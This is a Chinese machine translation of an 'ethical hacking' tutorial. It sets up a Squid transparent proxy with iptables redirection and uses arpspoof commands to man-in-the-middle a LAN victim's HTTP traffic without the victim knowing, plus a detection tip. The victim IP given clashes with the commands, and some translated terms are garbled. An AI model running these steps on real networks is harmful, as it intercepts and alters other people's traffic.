<html>
<head>
<title>Squid Transparent Proxy with ARP Spoofing</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">带有ARP欺骗的Squid透明代理</h1>
<blockquote>原文：<a href="https://levelup.gitconnected.com/ethical-hacking-part-11-squid-transparent-proxy-with-arp-spoofing-c272d2344989?source=collection_archive---------1-----------------------#2020-10-22">https://levelup.gitconnected.com/ethical-hacking-part-11-squid-transparent-proxy-with-arp-spoofing-c272d2344989?source=collection_archive---------1-----------------------#2020-10-22</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="85fd" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">道德黑客，了解风险以防止攻击—通过代理透明地重定向局域网流量</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ki"><img src="../Images/d9f2d333b8820729b4d46c6335c47b48.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vho1bB1zeLiVEUIiLh1eFQ.png"/></div></div></figure><p id="43f7" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated"><strong class="kw iu"> Squid不被认为是典型的道德黑客工具</strong>。它于1996年7月正式发布，<strong class="kw iu">它是一个缓存和转发HTTP web代理</strong>。它有多种用途，包括通过缓存重复请求、web流量和其他网络服务来加速web服务器。它也常用于过滤。我发现特别有趣的是<strong class="kw iu">如果流量是未加密的HTTP流量</strong>，它可以用于数据操作。</p><p id="d036" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如今大多数网站都使用HTTPS/SSL，这很重要。你真的不应该使用任何不是这样的网站，因为捕捉和操纵你收到的内容、强化你的凭证或欺骗你安装漏洞是很容易的。你可能认为你正在使用的网站不重要或没有加密风险低，但如果它允许黑客安装远程外壳，键盘记录器或任何其他讨厌的利用。在相当多的情况下，人们在多个网站上使用相同的登录凭证。如果黑客能够在低风险网站上看到您的用户名和密码，他们可以在其他更重要的网站上尝试相同的凭据。我在其他文章中提到过，如果一个网站提供2FA(双因素认证),你应该使用它。光有密码是不够的。</p><p id="e352" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">本文将为您提供一个教程，教您如何使用Squid，以及如何轻松地迫使不知情的受害者使用您的透明代理，而不让他们知道。</p><h2 id="d374" class="lq lr it bd ls lt lu dn lv lw lx dp ly ld lz ma mb lh mc md me ll mf mg mh mi bi translated">安装和配置Squid</h2><p id="70e6" class="pw-post-body-paragraph ku kv it kw b kx mj ju kz la mk jx lc ld ml lf lg lh mm lj lk ll mn ln lo lp im bi translated">我将把Squid安装到我的Kali linux实例中，但是你可以把它安装到任何基于linux的系统中。Kali和Ubuntu将是很好的选择，因为我在本文中使用的命令是相同的。你可以使用其他风格的Linux，比如Redhat，CentOS等等。但是您可能需要使用“<strong class="kw iu"> yum </strong>而不是“<strong class="kw iu"> apt </strong>”来安装软件包，它们可能会稍微有些不同。</p><p id="9448" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">实际安装很简单。我已经安装了，但是你要这样安装。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="1041" class="lq lr it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">apt-get install squid -y</strong><br/>Reading package lists... Done<br/>Building dependency tree       <br/>Reading state information... Done<br/>squid is already the newest version (4.13-1).<br/>0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</span></pre><p id="0904" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">Squid的配置文件是“<strong class="kw iu"> /etc/squid/squid.conf </strong>”。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="7bf8" class="lq lr it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">vi /etc/squid/squid.conf</strong></span></pre><p id="5e60" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">有许多配置选项，但我会告诉你本教程需要的主要选项。</p><p id="759b" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">编辑配置文件时，向下滚动到以“<strong class="kw iu"> acl localnet </strong>”开头的配置。您需要做的是包含您的本地子网，在我的例子中是“<strong class="kw iu"> 192.168.1.0/24 </strong>”。默认情况下，它将包括大多数RFC1918地址空间，因此根据您的本地网络，它可能已经包括在内。我喜欢把不适用的行注释掉，但那是可选的。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="e976" class="lq lr it mp b gy mt mu l mv mw"><strong class="mp iu">#</strong>acl localnet src 0.0.0.1-0.255.255.255 # RFC 1122 "this" network (LAN)<br/><strong class="mp iu">#</strong>acl localnet src 10.0.0.0/8  # RFC 1918 local private network (LAN)<br/><strong class="mp iu">#</strong>acl localnet src 100.64.0.0/10  # RFC 6598 shared address space (CGN)<br/><strong class="mp iu">#</strong>acl localnet src 169.254.0.0/16  # RFC 3927 link-local (directly plugged) machines<br/><strong class="mp iu">#</strong>acl localnet src 172.16.0.0/12  # RFC 1918 local private network (LAN)<br/><strong class="mp iu">#</strong>acl localnet src 192.168.0.0/16 # RFC 1918 local private network (LAN)<br/><strong class="mp iu">acl localnet src 192.168.1.0/24  # RFC 1918 local private network (LAN)</strong><br/><strong class="mp iu">#</strong>acl localnet src fc00::/7        # RFC 4193 local private network range<br/><strong class="mp iu">#</strong>acl localnet src fe80::/10       # RFC 4291 link-local (directly plugged) machines</span></pre><p id="539d" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">请定位“<strong class="kw iu"> http_access allow </strong>”配置。你可能会看到类似这样的东西。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="90d4" class="lq lr it mp b gy mt mu l mv mw">http_access allow localhost manager</span></pre><p id="dc5e" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">您可能希望将“<strong class="kw iu"> localnet </strong>”附加到该行的末尾，或者将其替换为“<strong class="kw iu"> http_access allow all </strong>”。你可以从“<strong class="kw iu">允许所有的</strong>”开始，然后在它工作后限制它，以确保你不会遇到问题。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="f100" class="lq lr it mp b gy mt mu l mv mw">http_access allow localhost manager localnet</span><span id="31aa" class="lq lr it mp b gy mx mu l mv mw"><strong class="mp iu">OR</strong></span><span id="d50f" class="lq lr it mp b gy mx mu l mv mw">http_access allow all</span></pre><p id="6a3b" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">接下来，我们希望将我们的Squid代理配置为透明代理。找到“<strong class="kw iu"> http_port 3128 </strong>”配置，并将其更改为。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="845a" class="lq lr it mp b gy mt mu l mv mw">http_port 192.168.1.2:8080<br/>http_port 192.168.1.2:3128 intercept</span></pre><p id="a5b9" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">请注意，您需要指定它将监听的IP地址，在我的例子中是“<strong class="kw iu"> 192.168.1.2 </strong>”。在早期版本中，这是不需要的，你可能看到的是“<strong class="kw iu">透明</strong>而不是“<strong class="kw iu">拦截</strong>”，但现在是这样做的。透明代理需要这两条线才能工作。</p><p id="5431" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">接下来找到这个配置块，并在它下面添加“<strong class="kw iu"> visible_hostname squid </strong>”。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="da76" class="lq lr it mp b gy mt mu l mv mw">#  TAG: visible_hostname<br/>#       If you want to present a special hostname in error messages, etc,<br/>#       define this.  Otherwise, the return value of gethostname()<br/>#       will be used. If you have multiple caches in a cluster and<br/>#       get errors about IP-forwarding you must set them to have individual<br/>#       names with this setting.<br/>#Default:<br/># Automatically detect the system host name<br/><strong class="mp iu">visible_hostname squid</strong></span></pre><p id="6e6a" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">找到该行并取消注释以启用日志记录。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="071f" class="lq lr it mp b gy mt mu l mv mw">access_log daemon:/var/log/squid/access.log squid</span></pre><p id="1dda" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">这就是我们现在要做的。真正有趣的部分是命令前缀“<strong class="kw iu"> url_rewrite_program </strong>”。这就是我们可以使用Perl脚本操纵未加密的HTTP流量的地方。搜索“<strong class="kw iu"> squid proxy pranks </strong>”以获得大量可以传递给它的脚本。</p><p id="ffc2" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">示例(<strong class="kw iu">仅适用于未加密的HTTP站点</strong>):</p><ul class=""><li id="991a" class="my mz it kw b kx ky la lb ld na lh nb ll nc lp nd ne nf ng bi translated">将所有图像上下翻转</li><li id="d4a1" class="my mz it kw b kx nh la ni ld nj lh nk ll nl lp nd ne nf ng bi translated">用自己的图像替换图像</li><li id="69fa" class="my mz it kw b kx nh la ni ld nj lh nk ll nl lp nd ne nf ng bi translated">用你自己的话替换单词</li><li id="9878" class="my mz it kw b kx nh la ni ld nj lh nk ll nl lp nd ne nf ng bi translated">向网站搜索添加单词</li></ul><p id="ba16" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">你总是可以发挥创意，写自己的作品。如果你有，为什么不把它作为一个评论留在这篇文章中，让读者去尝试:)</p><p id="de31" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">现在一切都配置好了，让我们重新启动Squid(这需要一些时间来耐心等待)。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="aca0" class="lq lr it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">service squid restart</strong></span></pre><p id="11c9" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">你可以确认它是这样工作的…</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="0f26" class="lq lr it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">systemctl status squid.service</strong><br/>● squid.service - Squid Web Proxy Server<br/>     Loaded: loaded (/lib/systemd/system/squid.service; disabled; vendor preset: disabled)<br/>     Active: active (running) since Wed 2020-10-21 22:45:27 BST; 6s ago<br/>       Docs: man:squid(8)<br/>    Process: 1726 ExecStartPre=/usr/sbin/squid --foreground -z (code=exited, status=0/SUCCESS)<br/>   Main PID: 1729 (squid)<br/>      Tasks: 4 (limit: 9479)<br/>     Memory: 16.1M<br/>     CGroup: /system.slice/squid.service<br/>             ├─1729 /usr/sbin/squid --foreground -sYC<br/>             ├─1731 (squid-1) --kid squid-1 --foreground -sYC<br/>             ├─1732 (logfile-daemon) /var/log/squid/access.log<br/>             └─1733 (pinger)</span><span id="a838" class="lq lr it mp b gy mx mu l mv mw">Oct 21 22:45:27 kali squid[1731]: Set Current Directory to /var/spool/squid<br/>Oct 21 22:45:27 kali squid[1731]: Finished loading MIME types and icons.<br/>Oct 21 22:45:27 kali squid[1731]: HTCP Disabled.<br/>Oct 21 22:45:27 kali squid[1731]: Pinger socket opened on FD 15<br/>Oct 21 22:45:27 kali systemd[1]: Started Squid Web Proxy Server.<br/>Oct 21 22:45:27 kali squid[1731]: Squid plugin modules loaded: 0<br/>Oct 21 22:45:27 kali squid[1731]: Adaptation support is off.<br/>Oct 21 22:45:27 kali squid[1731]: Accepting HTTP Socket connections at local=192.168.1.2:3128 remote=[::] FD 12 flags=9<br/>Oct 21 22:45:27 kali squid[1731]: Accepting NAT intercepted HTTP Socket connections at local=192.168.1.2:3128 remote=[::] FD 13 flags=41<br/>Oct 21 22:45:28 kali squid[1731]: storeLateRelease: released 0 objects</span></pre><p id="380e" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如果由于任何原因Squid没有启动，您可能有一个配置问题，它会给你一些提示，什么问题是要解决的。</p><p id="4b6e" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">为了做到这一点，我们需要将Kali配置为路由器，这样它就可以转发数据包。</p><h2 id="a26c" class="lq lr it bd ls lt lu dn lv lw lx dp ly ld lz ma mb lh mc md me ll mf mg mh mi bi translated">启用IPv4路由</h2><p id="8903" class="pw-post-body-paragraph ku kv it kw b kx mj ju kz la mk jx lc ld ml lf lg lh mm lj lk ll mn ln lo lp im bi translated">默认情况下，Linux系统不会路由非指定给它的流量。流量将被丢弃。为此，我们需要在机器上启用IP数据包转发。</p><p id="e50b" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">“<strong class="kw iu">/proc/sys/net/IP v4/IP _ forward</strong>”应该包含一个<strong class="kw iu"> 1 </strong>。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="3ce8" class="lq lr it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">echo "1" &gt; /proc/sys/net/ipv4/ip_forward</strong><br/>root@kali:~# <strong class="mp iu">cat /proc/sys/net/ipv4/ip_forward</strong><br/>1</span></pre><p id="bd68" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">编辑“<strong class="kw iu"> /etc/sysctl.conf </strong>”文件，并将“<strong class="kw iu"> net.ipv4.ip_forward </strong>”设置为<strong class="kw iu"> 1 </strong>。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="7ef1" class="lq lr it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">vi /etc/sysctl.conf</strong><br/>net.ipv4.ip_forward = 1</span></pre><p id="4c8c" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">保存文件并退出。现在执行下面的命令来实现所做的更改。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="93f3" class="lq lr it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">sysctl -p</strong><br/>net.ipv4.ip_forward = 1</span></pre><p id="4df6" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated"><strong class="kw iu"> IP表—防火墙规则</strong></p><p id="9c88" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如果你遵循了我的另一篇文章《<a class="ae nm" rel="noopener ugc nofollow" target="_blank" href="/ethical-hacking-part-10-arp-spoofing-ssl-strip-ea5f0cc892f3">道德黑客(第10部分):ARP欺骗&amp; SSL带</a>》，让我们确保没有剩余的配置。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="d379" class="lq lr it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">iptables -t nat -A PREROUTING</strong><br/>root@kali:~#</span><span id="abaf" class="lq lr it mp b gy mx mu l mv mw">root@kali:~# <strong class="mp iu">iptables -t nat -L</strong><br/><strong class="mp iu">Chain PREROUTING (policy ACCEPT)<br/>target     prot opt source               destination</strong></span><span id="9690" class="lq lr it mp b gy mx mu l mv mw">Chain INPUT (policy ACCEPT)<br/>target     prot opt source               destination</span><span id="025a" class="lq lr it mp b gy mx mu l mv mw">Chain POSTROUTING (policy ACCEPT)<br/>target     prot opt source               destination</span><span id="0615" class="lq lr it mp b gy mx mu l mv mw">Chain OUTPUT (policy ACCEPT)<br/>target     prot opt source               destination</span></pre><p id="8f21" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如果您看到NAT预路由规则，您可能想要刷新它们。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="3014" class="lq lr it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">iptables -t nat -F</strong></span></pre><p id="a8b9" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我们现在想在接口“<strong class="kw iu"> eth0 </strong>”上配置NAT预路由规则。对我来说是“T4”，但对你来说可能是不同的。您可以使用“<strong class="kw iu"> ifconfig </strong>”来确认您正在使用哪个接口。这个IP表规则将所有未加密的HTTP (TCP 80)流重定向到TCP 3128，这是我们的Squid透明代理。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="bd26" class="lq lr it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">iptables -t nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-port 3128</strong></span></pre><p id="615a" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">让我们确认它是否被正确添加…</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="409e" class="lq lr it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">iptables -t nat -L</strong><br/>Chain PREROUTING (policy ACCEPT)<br/>target     prot opt source               destination         <br/>           all  --  anywhere             anywhere            <br/>           all  --  anywhere             anywhere            <br/><strong class="mp iu">REDIRECT   tcp  --  anywhere             anywhere             tcp dpt:http redir ports 3128</strong><br/>           all  --  anywhere             anywhere</span></pre><h2 id="c9c1" class="lq lr it bd ls lt lu dn lv lw lx dp ly ld lz ma mb lh mc md me ll mf mg mh mi bi translated"><strong class="ak"> ARP欺骗</strong></h2><p id="e0ec" class="pw-post-body-paragraph ku kv it kw b kx mj ju kz la mk jx lc ld ml lf lg lh mm lj lk ll mn ln lo lp im bi translated">我已经在我的另一篇文章《<a class="ae nm" rel="noopener ugc nofollow" target="_blank" href="/ethical-hacking-part-10-arp-spoofing-ssl-strip-ea5f0cc892f3">道德黑客(第10部分):ARP欺骗&amp; SSL Strip </a>》中讨论过这个问题，但是我将在这里重述一下。如果你使用的是Kali Linux，那么“<strong class="kw iu"> arpspoof </strong>”将会被安装，但是如果你使用的是其他Linux系统，你将需要安装它。</p><p id="3821" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">出于本教程的目的，我将使用以下内容:</p><ul class=""><li id="9538" class="my mz it kw b kx ky la lb ld na lh nb ll nc lp nd ne nf ng bi translated"><strong class="kw iu">受害人</strong> : 192.168.1.2</li><li id="ff6d" class="my mz it kw b kx nh la ni ld nj lh nk ll nl lp nd ne nf ng bi translated"><strong class="kw iu">路由器/网关</strong> : 192.168.1.254</li></ul><p id="c5d6" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">请你打开两个终端窗口，运行以下…</p><p id="9277" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated"><strong class="kw iu">终端窗口1 </strong></p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="1eab" class="lq lr it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.254</strong></span></pre><p id="1b6f" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">这个命令的目标是192.168.1.1，当“<strong class="kw iu"> arpspoof </strong>”运行时，会将所有流量定向到运行该命令的系统192.168.1.254，在我的例子中是Kali Linux。如果您在命令运行前后在192.168.1.1上运行"<strong class="kw iu"> arp -a </strong>或"<strong class="kw iu"> arp 192.168.1.254 </strong>，您将看到192.168.1.254的MAC地址将从路由器/默认网关的实际MAC地址更改为Kali Linux实例。</p><p id="1f50" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated"><strong class="kw iu">终端窗口2 </strong></p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="4233" class="lq lr it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">arpspoof -i eth0 -t 192.168.1.254 -r 192.168.1.1</strong></span></pre><p id="7117" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">因此，它将处理来自受害者出站的流量，并在Kali Linux上引导流量，这些流量又将被重定向到Squid代理，然后发送到路由器。现在我们需要处理返回流量，因为我们不希望路由器直接响应受害者。我们还希望通过Squid代理来定向响应。上面的命令在运行时会告诉路由器，要到达192.168.1.1，请将其定向到Kali Linux实例。</p><h2 id="9605" class="lq lr it bd ls lt lu dn lv lw lx dp ly ld lz ma mb lh mc md me ll mf mg mh mi bi translated">Squid代理日志</h2><p id="2e0c" class="pw-post-body-paragraph ku kv it kw b kx mj ju kz la mk jx lc ld ml lf lg lh mm lj lk ll mn ln lo lp im bi translated">这是可选的，但我真的建议这样做。打开第三个终端窗口并“<strong class="kw iu">tail</strong>”Squid代理日志。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="ac9c" class="lq lr it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">clear; tail -f -n 0 /var/log/squid/access.log</strong></span></pre><p id="cf11" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">这将很方便，因为它将实时显示通过Squid代理路由的未加密HTTP请求。</p><h2 id="3458" class="lq lr it bd ls lt lu dn lv lw lx dp ly ld lz ma mb lh mc md me ll mf mg mh mi bi translated">正常运算</h2><p id="ceff" class="pw-post-body-paragraph ku kv it kw b kx mj ju kz la mk jx lc ld ml lf lg lh mm lj lk ll mn ln lo lp im bi translated">只是为了确认一切正常…</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="6ee8" class="lq lr it mp b gy mt mu l mv mw">% <strong class="mp iu">arp 192.168.1.254 </strong><br/>? (192.168.1.254) at <strong class="mp iu">8:0:27:24:30:b1</strong> on en1 ifscope [ethernet]</span></pre><p id="00ea" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">"<strong class="kw iu"> 8:0:27:24:30:b1 </strong>"是Kali Linux实例的MAC地址，但却是路由器/默认网关的IP地址。</p><p id="98de" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如果我们对互联网(Google DNS服务器)做一个“<strong class="kw iu"> traceroute </strong>”，我们会看到现在路径上增加了一个额外的跳。来自192.168.1.1的流量应该直接到达作为默认网关的192.168.1.254，但是随着ARP欺骗的进行，它现在到达192.168.1.2，然后到达192.168.1.254。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="226b" class="lq lr it mp b gy mt mu l mv mw">% <strong class="mp iu">traceroute 8.8.8.8</strong><br/>traceroute to 8.8.8.8 (8.8.8.8), 64 hops max, 52 byte packets<br/> 1  <strong class="mp iu">192.168.1.2</strong> (192.168.1.2)  0.447 ms  0.267 ms  0.198 ms</span></pre><p id="6878" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">其工作方式如下。任何非未加密HTTP (TCP 80)的流量都将被定向到Kali Linux实例，并被路由到默认网关。将不使用Squid代理。如果请求是HTTP，那么IP表规则将在Squid代理端口引导流，您将看到。该请求登记在“<strong class="kw iu">尾的</strong>日志中。</p><p id="58a6" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">非常可怕的是，这可以在完全没有访问受害者机器的情况下如此容易地完成。如果网络上没有任何第二层安全性来缓解这种情况，这真的是免费的。</p><p id="6f0a" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">您可能想知道如何判断这是否发生在网络上，以及攻击来自哪里。其实有一个简单的答案。您应该只看到ARP缓存中唯一的MAC地址列表(<strong class="kw iu"> arp -a </strong>)。如果您看到重复的MAC条目，尤其是其他主机与您的路由器/默认网关共享同一个MAC，您就受到了攻击。攻击来自共享同一台MAC的主机。</p><h2 id="9706" class="lq lr it bd ls lt lu dn lv lw lx dp ly ld lz ma mb lh mc md me ll mf mg mh mi bi translated">数据处理/恶作剧</h2><p id="a009" class="pw-post-body-paragraph ku kv it kw b kx mj ju kz la mk jx lc ld ml lf lg lh mm lj lk ll mn ln lo lp im bi translated">我之前提到过，你可以通过Perl脚本过滤你的流量。在你的Squid代理文件中，你可以在文件的底部加上“<strong class="kw iu">URL _ rewrite _ program&lt;script&gt;</strong>”。</p><p id="1c77" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">几个Squid代理脚本可以在“<a class="ae nm" href="http://prank-o-matic.com/" rel="noopener ugc nofollow" target="_blank"><strong class="kw iu">”</strong></a>”上找到。现在“<a class="ae nm" href="http://prank-o-matic.com/google/google.pl" rel="noopener ugc nofollow" target="_blank"><strong class="kw iu">”Google . pl</strong></a>”不再工作，因为你不能只使用HTTP访问搜索引擎。这个脚本几年前做的就是在你所有的搜索中添加搜索词！</p><p id="543e" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">虽然脚本不再工作，但你可以看到脚本的样子，并有可能使用你的创造力，创造你自己的。如果你有一些不错的脚本，请在评论中分享:)</p><h2 id="77f6" class="lq lr it bd ls lt lu dn lv lw lx dp ly ld lz ma mb lh mc md me ll mf mg mh mi bi translated">摘要</h2><p id="a787" class="pw-post-body-paragraph ku kv it kw b kx mj ju kz la mk jx lc ld ml lf lg lh mm lj lk ll mn ln lo lp im bi translated">尽管现在大多数网站都使用HTTPS/SSL(你不应该使用不使用它的网站),并且大多数现代浏览器都有安全机制来检测和阻止类似的代理访问，但是通过一个实际的例子来看看各种技术是如何协同工作的还是很有用的。Squid还支持许多其他协议，所以如果你感兴趣，它可能会研究你还能做什么。</p><p id="8a64" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">为了进一步阅读，看看我写的关于这个话题的19个故事。</p><div class="nn no gp gr np"><div role="button" tabindex="0" class="ab bv gv cb fp nq nr bn ns ks ex"><div class="nt l"><div class="ab q"><div class="l di"><img alt="Michael Whittle" class="l de bw nu nv fe" src="../Images/f4d39d0c62b7f2e165491c1e2a8c6e26.png" width="20" height="20" loading="lazy" data-original-src="https://miro.medium.com/v2/resize:fill:40:40/1*efn30YXRNnd9uk7qbTOGnA.jpeg"/><div class="fb bw l nu nv fc n aw fd"/></div><div class="hh l fo"><p class="bd b dl z fp fq fr fs ft fu fv fw dk translated">迈克尔·惠特尔</p></div></div><div class="ny nz gw l"><h2 class="bd iu tt my fp tu fr fs tv fu fw is bi translated">道德黑客培训课程</h2></div><div class="ab q"><div class="l fo"><a class="bd b be z bi tw au tx ty tz qh ua an eh ei ub uc ud el em eo de bk ep" href="https://whittle.medium.com/list/ethical-hacking-training-course-710769700b83?source=post_page-----c272d2344989--------------------------------" rel="noopener follow" target="_top">View list</a></div><div class="ue l fo"><span class="bd b dl z dk">19 stories</span></div></div></div><div class="ol dh om fp ab on fo di"><div class="di od bv oe of"><div class="dh l"><img alt="" class="dh" src="../Images/57c6829d9a7a0ff6d78e5d828845bb8c.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*UJZPySDP-tEonnesSAbLgA.png"/></div></div><div class="di od bv og oh oi"><div class="dh l"><img alt="" class="dh" src="../Images/e2d3aa85ee76ceb2b889dd753c231b67.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*rt1tdkIaxU8p69xo_yz9zg.jpeg"/></div></div><div class="di bv oj ok oi"><div class="dh l"><img alt="" class="dh" src="../Images/6240cd235d84e9cd8cb158d7147a71f5.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*78Op5N9xBfarPgmmwpHCQQ.jpeg"/></div></div></div></div></div><h1 id="5b44" class="or lr it bd ls os ot ou lv ov ow ox ly jz oy ka mb kc oz kd me kf pa kg mh pb bi translated">迈克尔·惠特尔</h1><ul class=""><li id="5302" class="my mz it kw b kx mj la mk ld pc lh pd ll pe lp nd ne nf ng bi translated"><strong class="kw iu"> <em class="pf">如果你喜欢这个，请</em> </strong> <a class="ae nm" href="https://whittle.medium.com/" 